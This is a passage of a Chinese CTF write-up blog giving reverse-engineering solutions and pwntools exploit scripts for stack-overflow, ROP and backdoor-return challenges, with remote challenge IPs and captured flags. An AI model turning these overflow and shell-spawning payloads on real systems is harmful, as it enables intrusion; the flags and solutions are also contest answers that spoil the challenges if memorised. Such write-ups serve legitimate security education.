class="number">0</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>z3解方程</p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">flag=[<span class="number">0</span>]*<span class="number">22</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">    flag[i] = z3.Int(<span class="string">&quot;flag[%d]&quot;</span>%i)</span><br><span class="line">S=Solver()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">S.add(<span class="number">3201</span>*flag[<span class="number">0</span>]+<span class="number">2051</span>*flag[<span class="number">1</span>]+<span class="number">3541</span>*flag[<span class="number">2</span>]+<span class="number">395</span>*flag[<span class="number">3</span>]+<span class="number">245</span>*flag[<span class="number">4</span>]+<span class="number">1345</span>*flag[<span class="number">5</span>]==<span class="number">855009</span>,</span><br><span class="line"><span class="number">1546</span>*flag[<span class="number">0</span>]+<span class="number">3963</span>*flag[<span class="number">1</span>]+<span class="number">3900</span>*flag[<span class="number">2</span>]+<span class="number">3759</span>*flag[<span class="number">3</span>]+<span class="number">3270</span>*flag[<span class="number">4</span>]+<span class="number">3082</span>*flag[<span class="number">5</span>]==<span class="number">1515490</span>,</span><br><span class="line"><span class="number">2012</span>*flag[<span class="number">0</span>]+<span class="number">2458</span>*flag[<span class="number">1</span>]+<span class="number">3349</span>*flag[<span class="number">2</span>]+<span class="number">2283</span>*flag[<span class="number">3</span>]+<span class="number">526</span>*flag[<span class="number">4</span>]+<span class="number">268</span>*flag[<span class="number">5</span>]==<span class="number">854822</span>,</span><br><span class="line"><span class="number">2569</span>*flag[<span class="number">0</span>]+<span class="number">1571</span>*flag[<span class="number">1</span>]+<span class="number">3146</span>*flag[<span class="number">2</span>]+<span class="number">2021</span>*flag[<span class="number">3</span>]+<span class="number">3208</span>*flag[<span class="number">4</span>]+<span class="number">1395</span>*flag[<span class="number">5</span>]==<span class="number">1094422</span>,</span><br><span class="line"><span class="number">1575</span>*flag[<span class="number">0</span>]+<span class="number">1824</span>*flag[<span class="number">1</span>]+<span class="number">2997</span>*flag[<span class="number">2</span>]+<span class="number">3553</span>*flag[<span class="number">3</span>]+<span class="number">3136</span>*flag[<span class="number">4</span>]+<span class="number">1599</span>*flag[<span class="number">5</span>]==<span class="number">1136398</span>,</span><br><span class="line"><span class="number">2908</span>*flag[<span class="number">0</span>]+<span class="number">3672</span>*flag[<span class="number">1</span>]+<span class="number">86</span>*flag[<span class="number">2</span>]+<span class="number">1349</span>*flag[<span class="number">3</span>]+<span class="number">2300</span>*flag[<span class="number">4</span>]+<span class="number">1681</span>*flag[<span class="number">5</span>]==<span class="number">939991</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">202</span>+flag[<span class="number">7</span>]*<span class="number">56</span>+flag[<span class="number">8</span>]*<span class="number">485</span>+flag[<span class="number">9</span>]*<span class="number">325</span>+flag[<span class="number">10</span>]*<span class="number">490</span>+flag[<span class="number">18</span>]*<span class="number">342</span>+flag[<span class="number">19</span>]*<span class="number">153</span>+flag[<span class="number">20</span>]*<span class="number">212</span>+flag[<span class="number">21</span>]*<span class="number">191</span>==<span class="number">245940</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">207</span>+flag[<span class="number">7</span>]*<span class="number">460</span>+flag[<span class="number">8</span>]*<span class="number">22</span>+flag[<span class="number">9</span>]*<span class="number">24</span>+flag[<span class="number">10</span>]*<span class="number">153</span>+flag[<span class="number">18</span>]*<span class="number">134</span>+flag[<span class="number">19</span>]*<span class="number">185</span>+flag[<span class="number">20</span>]*<span class="number">348</span>+flag[<span class="number">21</span>]*<span class="number">22</span>==<span class="number">146392</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">154</span>+flag[<span class="number">7</span>]*<span class="number">164</span>+flag[<span class="number">8</span>]*<span class="number">311</span>+flag[<span class="number">9</span>]*<span class="number">433</span>+flag[<span class="number">10</span>]*<span class="number">339</span>+flag[<span class="number">18</span>]*<span class="number">489</span>+flag[<span class="number">19</span>]*<span class="number">231</span>+flag[<span class="number">20</span>]*<span class="number">177</span>+flag[<span class="number">21</span>]*<span class="number">100</span>==<span class="number">239438</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">360</span>+flag[<span class="number">7</span>]*<span class="number">270</span>+flag[<span class="number">8</span>]*<span class="number">22</span>+flag[<span class="number">9</span>]*<span class="number">470</span>+flag[<span class="number">10</span>]*<span class="number">466</span>+flag[<span class="number">18</span>]*<span class="number">68</span>+flag[<span class="number">19</span>]*<span class="number">337</span>+flag[<span class="number">20</span>]*<span class="number">257</span>+flag[<span class="number">21</span>]*<span class="number">82</span>==<span class="number">233887</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">197</span>+flag[<span class="number">7</span>]*<span class="number">92</span>+flag[<span class="number">8</span>]*<span class="number">73</span>+flag[<span class="number">9</span>]*<span class="number">151</span>+flag[<span class="number">10</span>]*<span class="number">91</span>+flag[<span class="number">18</span>]*<span class="number">468</span>+flag[<span class="number">19</span>]*<span class="number">235</span>+flag[<span class="number">20</span>]*<span class="number">246</span>+flag[<span class="number">21</span>]*<span class="number">54</span>==<span class="number">152663</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">242</span>+flag[<span class="number">7</span>]*<span class="number">376</span>+flag[<span class="number">8</span>]*<span class="number">55</span>+flag[<span class="number">9</span>]*<span class="number">233</span>+flag[<span class="number">10</span>]*<span class="number">243</span>+flag[<span class="number">18</span>]*<span class="number">131</span>+flag[<span class="number">19</span>]*<span class="number">377</span>+flag[<span class="number">20</span>]*<span class="number">241</span>+flag[<span class="number">21</span>]*<span class="number">343</span>==<span class="number">228375</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">364</span>+flag[<span class="number">7</span>]*<span class="number">284</span>+flag[<span class="number">8</span>]*<span class="number">301</span>+flag[<span class="number">9</span>]*<span class="number">136</span>+flag[<span class="number">10</span>]*<span class="number">458</span>+flag[<span class="number">18</span>]*<span class="number">5</span>+flag[<span class="number">19</span>]*<span class="number">200</span>+flag[<span class="number">20</span>]*<span class="number">356</span>+flag[<span class="number">21</span>]*<span class="number">61</span>==<span class="number">211183</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">66</span>+flag[<span class="number">7</span>]*<span class="number">71</span>+flag[<span class="number">8</span>]*<span class="number">80</span>+flag[<span class="number">9</span>]*<span class="number">17</span>+flag[<span class="number">10</span>]*<span class="number">107</span>+flag[<span class="number">18</span>]*<span class="number">406</span>+flag[<span class="number">19</span>]*<span class="number">55</span>+flag[<span class="number">20</span>]*<span class="number">154</span>+flag[<span class="number">21</span>]*<span class="number">71</span>==<span class="number">96788</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">56</span>+flag[<span class="number">7</span>]*<span class="number">409</span>+flag[<span class="number">8</span>]*<span class="number">280</span>+flag[<span class="number">9</span>]*<span class="number">197</span>+flag[<span class="number">10</span>]*<span class="number">494</span>+flag[<span class="number">18</span>]*<span class="number">63</span>+flag[<span class="number">19</span>]*<span class="number">201</span>+flag[<span class="number">20</span>]*<span class="number">335</span>+flag[<span class="number">21</span>]*<span class="number">99</span>==<span class="number">204625</span>,</span><br><span class="line"><span class="number">81</span>*flag[<span class="number">11</span>]+<span class="number">3001</span>*flag[<span class="number">12</span>]+<span class="number">1967</span>*flag[<span class="number">13</span>]+<span class="number">1326</span>*flag[<span class="number">14</span>]+<span class="number">1266</span>*flag[<span class="number">15</span>]+<span class="number">428</span>*flag[<span class="number">16</span>]+<span class="number">2439</span>*flag[<span class="number">17</span>]==<span class="number">1109296</span>,</span><br><span class="line"><span class="number">164</span>*flag[<span class="number">11</span>]+<span class="number">3073</span>*flag[<span class="number">12</span>]+<span class="number">2539</span>*flag[<span class="number">13</span>]+<span class="number">141</span>*flag[<span class="number">14</span>]+<span class="number">4027</span>*flag[<span class="number">15</span>]+<span class="number">2585</span>*flag[<span class="number">16</span>]+<span class="number">1556</span>*flag[<span class="number">17</span>]==<span class="number">1368547</span>,</span><br><span class="line"><span class="number">2197</span>*flag[<span class="number">11</span>]+<span class="number">3681</span>*flag[<span class="number">12</span>]+<span class="number">1341</span>*flag[<span class="number">13</span>]+<span class="number">1317</span>*flag[<span class="number">14</span>]+<span class="number">358</span>*flag[<span class="number">15</span>]+<span class="number">2080</span>*flag[<span class="number">16</span>]+<span class="number">1205</span>*flag[<span class="number">17</span>]==<span class="number">1320274</span>,</span><br><span class="line"><span class="number">1496</span>*flag[<span class="number">11</span>]+<span class="number">3843</span>*flag[<span class="number">12</span>]+<span class="number">235</span>*flag[<span class="number">13</span>]+<span class="number">2353</span>*flag[<span class="number">14</span>]+<span class="number">1494</span>*flag[<span class="number">15</span>]+<span class="number">840</span>*flag[<span class="number">16</span>]+<span class="number">1302</span>*flag[<span class="number">17</span>]==<span class="number">1206735</span>,</span><br><span class="line"><span class="number">3008</span>*flag[<span class="number">11</span>]+<span class="number">2143</span>*flag[<span class="number">12</span>]+<span class="number">1559</span>*flag[<span class="number">13</span>]+<span class="number">2842</span>*flag[<span class="number">14</span>]+<span class="number">2025</span>*flag[<span class="number">15</span>]+<span class="number">101</span>*flag[<span class="number">16</span>]+<span class="number">981</span>*flag[<span class="number">17</span>]==<span class="number">1306983</span>,</span><br><span class="line"><span class="number">1017</span>*flag[<span class="number">11</span>]+<span class="number">816</span>*flag[<span class="number">12</span>]+<span class="number">292</span>*flag[<span class="number">13</span>]+<span class="number">1733</span>*flag[<span class="number">14</span>]+<span class="number">3822</span>*flag[<span class="number">15</span>]+<span class="number">1290</span>*flag[<span class="number">16</span>]+<span class="number">3199</span>*flag[<span class="number">17</span>]==<span class="number">1160573</span>,</span><br><span class="line"><span class="number">98</span>*flag[<span class="number">11</span>]+<span class="number">138</span>*flag[<span class="number">12</span>]+<span class="number">3584</span>*flag[<span class="number">13</span>]+<span class="number">2136</span>*flag[<span class="number">14</span>]+<span class="number">2712</span>*flag[<span class="number">15</span>]+<span class="number">186</span>*flag[<span class="number">16</span>]+<span class="number">1173</span>*flag[<span class="number">17</span>]==<span class="number">1005746</span>)</span><br><span class="line">S.check()</span><br><span class="line">t = S.model()</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">    <span class="keyword">try</span>:<span class="built_in">print</span>(t[flag[i]],end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:<span class="keyword">pass</span></span><br><span class="line">sb = [<span class="number">78</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">67</span>,<span class="number">84</span>,<span class="number">70</span>,<span class="number">123</span>,<span class="number">112</span>,<span class="number">105</span>,<span class="number">112</span>,<span class="number">95</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">64</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">95</span>,<span class="number">90</span>,<span class="number">51</span>,<span class="number">125</span>,]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sb:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>NSSCTF{pip_inst@ll_Z3}</p><h2 id="e-sy-flower"><a href="#e-sy-flower" class="headerlink" title="e@sy_flower"></a>e@sy_flower</h2><p>很明显的花指令。</p><p><img src="/posts/9d7b/image-20221023100120874.png" alt="image"></p><p>一般来说，汇编语言的跳转应该是直接是一个地址，而不会出现+1这种情况，出现这种情况一般是由脏字导致，于是我们把爆红的地方按快捷键u转化为数据，可以看到，D4处是垃圾数据，正常的函数应该是从unk_401D5处开始的，而由于脏字的加入导致反编译失败。</p><p><img src="/posts/9d7b/image-20221023101053945.png" alt="image"></p><p>按快捷键c把unk_401D5后的数据转化成代码，同时把垃圾数据nop掉即可，把错误的地方按p重新识别为函数。</p><p><img src="/posts/9d7b/image-20221023100609377.png" alt="image"></p><p>主函数编译出来了。加密逻辑就是输入数据的<code>v[2*i-1]</code>和<code>v[2*i]</code>交换后和0x30异或。</p><p><img src="/posts/9d7b/image-20221023102052453.png" alt="image"></p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = [<span class="number">0x63</span>, <span class="number">0x7E</span>, <span class="number">0x73</span>, <span class="number">0x63</span>, <span class="number">0x76</span>, <span class="number">0x64</span>, <span class="number">0x7A</span>, <span class="number">0x4B</span>, <span class="number">0x43</span>, <span class="number">0x45</span>, </span><br><span class="line">      <span class="number">0x6F</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0x5A</span>, <span class="number">0x5B</span>, <span class="number">0x5E</span>, <span class="number">0x72</span>, <span class="number">0x6F</span>, <span class="number">0x44</span>, <span class="number">0x49</span>, </span><br><span class="line">      <span class="number">0x43</span>, <span class="number">0x55</span>, <span class="number">0x4D</span>, <span class="number">0x43</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, (<span class="built_in">len</span>(<span class="built_in">str</span>)+<span class="number">1</span>)//<span class="number">2</span>):</span><br><span class="line">    temp = <span class="built_in">str</span>[<span class="number">2</span>*i]</span><br><span class="line">    <span class="built_in">str</span>[<span class="number">2</span>*i] = <span class="built_in">str</span>[<span class="number">2</span>*i+<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">str</span>[<span class="number">2</span>*i+<span class="number">1</span>] = temp</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    ans = <span class="built_in">str</span>[i] ^ <span class="number">0x30</span></span><br><span class="line">    flag = flag + <span class="built_in">chr</span>(ans)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>NSSCTF{Just_junk_Bytess}</p><h2 id="Packet"><a href="#Packet" class="headerlink" title="Packet"></a>Packet</h2><p>查壳后发现程序加壳了，是upx3.96。脱壳即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> Str2[<span class="number">160</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">128</span>]; <span class="comment">// [rsp+C0h] [rbp+40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line">  <span class="built_in">do_something</span>(Str2, v5);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(enc, Str2) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;yes!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>v5与str2经过do_something加密后为密文enc</p><p><img src="/posts/9d7b/image-20221021105716955.png" alt="image-20221021105716955"></p><p>很明显的换表base64加密。</p><p>密文enc&#x3D;’tLntq1rgE1vqwf8XC19Zmf8Zyxn5Fq&#x3D;&#x3D;’那么经过换表base64解迷2就是flag了。</p><p>NSSCTF{UPX_1s_s0_3asy}</p><h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><p>提示要点99999999下才能拿到flag，ce找基址然后改内存即可。</p><p><img src="/posts/9d7b/image-20221021110552499.png" alt="image-20221021110552499"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h2><p>Source</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input something&quot;</span>);</span><br><span class="line">    <span class="type">char</span> name[<span class="number">30</span>];</span><br><span class="line">    <span class="type">int</span> number=<span class="number">0</span>;</span><br><span class="line">    gets(name);</span><br><span class="line">    <span class="keyword">if</span>(number!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You win.&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gets存在栈溢出，gdb一下，可以看到cmp是拿[rbp - 4]即0x8c的值和0进行比较，那么可以推断出number的值就是存在这个地址里，栈顶rsp为0x60距离0x8c有0x2c个单位，那么就要存入0x2d个1就能覆盖number的值。就拿到flag了。</p><p><img src="/posts/9d7b/image-20221014112957850.png" alt="image-20221014112957850"></p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">sh = remote(<span class="string">&#x27;43.143.7.97&#x27;</span>,<span class="number">28048</span>)</span><br><span class="line">payload = <span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x2d</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ezcmp"><a href="#ezcmp" class="headerlink" title="ezcmp"></a>ezcmp</h2><p>给源文件了，基本逻辑就是buff经过enccrypto加密。我们输入密文就能得到shell。</p><p><img src="/posts/9d7b/image-20221027104049616.png" alt="image"></p><p>源文件已经给我们了，直接写脚本即可，注意要&amp;0xff得到byte形式的密文（有不可见字符），要不然打不通。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> buff[<span class="number">100</span>];</span><br><span class="line"><span class="type">int</span> v0;</span><br><span class="line"><span class="type">char</span> buffff[] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234&quot;</span>;</span><br><span class="line"><span class="type">char</span> bua[] = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz4321&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">enccrypt</span><span class="params">(<span class="type">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">29</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a = <span class="built_in">rand</span>();</span><br><span class="line">        buf[i] ^= buffff[i];</span><br><span class="line">        buff[i] ^= bua[i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">29</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">        &#123;</span><br><span class="line">            buf[j] = buff[i];</span><br><span class="line">            buf[i] += <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        buf[i] -= ((bua[i] ^ <span class="number">0x30</span>) * (buffff[i] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">        buf[i] += (a % buff[i]) &amp; <span class="number">0xff</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[] = <span class="string">&quot;Ayaka_nbbbbbbbbbbbbbbbbb_pluss&quot;</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(buff, buf);</span><br><span class="line">    <span class="type">char</span> test[<span class="number">30</span>];</span><br><span class="line">    <span class="type">int</span> v0 = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">srand</span>(v0);</span><br><span class="line">    <span class="built_in">enccrypt</span>(buff);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>, buff[i]&amp;<span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>windows和linux平台跑出来的结果不一样，用gcc编译。</p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;43.143.7.97&#x27;</span>,<span class="number">28967</span>)</span><br><span class="line">playload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">0x72</span>,<span class="number">0x40</span>,<span class="number">0xe</span>,<span class="number">0xdc</span>,<span class="number">0xaa</span>,<span class="number">0x78</span>,<span class="number">0x46</span>,<span class="number">0x14</span>,<span class="number">0xe2</span>,<span class="number">0xb0</span>,<span class="number">0x7e</span>,<span class="number">0x4c</span>,<span class="number">0x1a</span>,<span class="number">0xe8</span>,<span class="number">0xb6</span>,<span class="number">0x84</span>,<span class="number">0x52</span>,<span class="number">0x20</span>,<span class="number">0xee</span>,<span class="number">0xbc</span>,<span class="number">0x8a</span>,<span class="number">0x58</span>,<span class="number">0x26</span>,<span class="number">0xf4</span>,<span class="number">0xc2</span>,<span class="number">0x90</span>,<span class="number">0x5e</span>,<span class="number">0x2c</span>,<span class="number">0xcb</span>,<span class="number">0xc8</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    playload += <span class="built_in">chr</span>(i)</span><br><span class="line">p.sendline(playload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ezr0p32"><a href="#ezr0p32" class="headerlink" title="ezr0p32"></a>ezr0p32</h2><p><img src="/posts/9d7b/image-20221027104820709.png" alt="image-20221027104820709"></p><p>有两个read函数，rop32不需要泄露libc地址，system函数在题中已经给出，我们在第一个read写入&#x2F;bin&#x2F;sh即可。</p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;43.143.7.97&#x27;</span>,<span class="number">28131</span>)</span><br><span class="line">system_addr = <span class="number">0x08048562</span></span><br><span class="line">bin_addr = <span class="number">0x0804A080</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;please tell me your name\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x1c</span> + <span class="number">0x4</span>) + p32(system_addr) + p32(bin_addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;now it&#x27;s your play time~\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ez-backdoor"><a href="#ez-backdoor" class="headerlink" title="ez_backdoor"></a>ez_backdoor</h2><p>主函数，可以看到vnln里面，read(0, buf, 0x140uLL);存在溢出。覆盖返回地址即可。</p><p><img src="/posts/9d7b/image-20221020145647559.png" alt="image"></p><p>后门函数的地址在0x4011d2，溢出量为0x100。</p><p><img src="/posts/9d7b/image-20221020145810487.png" alt="image-20221020145810487"></p><p>exp.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;43.143.7.127&#x27;,28064)</span><br><span class="line">payload = b&#x27;a&#x27;*(0x100 + 0x8) + p64(0x4011d2)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 